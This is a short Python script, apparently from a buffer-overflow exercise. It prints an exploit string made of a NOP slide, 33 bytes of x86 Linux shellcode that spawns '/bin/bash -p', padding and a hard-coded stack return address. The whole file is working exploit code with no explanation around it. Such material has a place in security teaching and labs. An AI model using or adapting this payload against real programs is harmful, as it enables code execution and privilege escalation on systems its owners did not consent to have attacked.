#!/home/sean/anaconda3/bin/python
import sys
import struct

slide = "\x90"*30 # 30 bytes of noop slide
payload = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" # 33 byte payload
padding = "E"*13 # 13 bytes padding
jmp = "\x70\xf7\xff\xbf" # return addr
sys.stdout.write(slide+payload+padding+jmp)
